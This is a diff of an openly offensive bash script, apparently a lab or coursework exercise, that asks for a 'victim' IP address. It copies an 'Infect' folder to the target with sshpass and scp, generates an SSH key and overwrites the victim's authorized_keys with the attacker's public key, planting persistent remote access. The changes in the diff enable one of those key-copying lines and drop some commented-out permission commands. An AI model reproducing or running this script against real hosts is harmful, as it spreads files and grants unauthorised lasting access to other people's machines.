@@ -23,12 +23,8 @@ read -p "Enter Victim IP Address: " IP_Address
 sshpass -e scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
-SSH_PATH="/home/victim/.ssh" #"/root/.ssh"
+SSH_PATH="/home/victim/.ssh"
 
-#mkdir -p "$SSH_PATH"/id_rsa.pub
-#mkdir -p "$SSH_PATH"/authorized_keys
-#mkdir -p "SSH_PATH"/.ssh
-#chmod 700 "$SSH_PATH"
 ssh-keygen
 #sshpass -e ssh victim@"$IP_Address" 'mkdir -p "$SSH_PATH";'
 
@@ -37,14 +33,10 @@ ssh-keygen
 #ssh victim@"$IP_Address"
 
 #chmod 700 "$SSH_PATH"
-#sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
+sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 #sshpass -e ssh -o "StrictHostKeyChecking no" victim@"$IP_Address" 'cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
 # sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys/
-#chmod 777 "$SSH_PATH"
-#chmod 777 "$SSH_PATH"/authorized_keys
-#chown victim "$SSH_PATH"
-#chown victim "$SSH_PATH"/authorized_keys
 
 # sshpass -e ssh -o "StrictHostKeyChecking=no" victim@"$IP_Address" 'cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
 
